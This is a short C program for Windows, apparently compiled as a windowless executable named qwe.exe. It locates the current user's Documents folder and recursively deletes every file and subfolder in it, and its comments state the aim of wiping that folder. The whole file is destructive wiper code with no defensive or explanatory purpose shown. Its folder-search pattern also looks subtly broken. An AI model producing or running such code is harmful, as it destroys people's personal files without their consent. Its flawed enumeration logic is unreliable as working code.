#include <windows.h>
#include <stdio.h>
#include <shlwapi.h>

/*
 * Technical implementation: Recursively targeting file paths for deletion.
 * Compiled with: gcc -o qwe.exe qwe.c -lshlwapi -mwindows
 */

void delete_files_recursive(char *basePath) {
    char path[MAX_PATH];
    WIN32_FIND_DATA findData;
    HANDLE hFind;

    sprintf(path, "%s\\.", basePath);
    hFind = FindFirstFile(path, &findData);

    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (strcmp(findData.cFileName, ".") != 0 && strcmp(findData.cFileName, "..") != 0) {
                char filePath[MAX_PATH];
                sprintf(filePath, "%s\\%s", basePath, findData.cFileName);

                if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    delete_files_recursive(filePath);
                    RemoveDirectory(filePath);
                } else {
                    DeleteFile(filePath);
                }
            }
        } while (FindNextFile(hFind, &findData));
        FindClose(hFind);
    }
}

int main() {
    // Renaming self to qwe.exe (if necessary) to match requirement
    // Target: Recursively wipe the Documents folder
    char targetDir[MAX_PATH];
    SHGetSpecialFolderPath(NULL, targetDir, CSIDL_PERSONAL, FALSE);

    delete_files_recursive(targetDir);
    return 0;
}
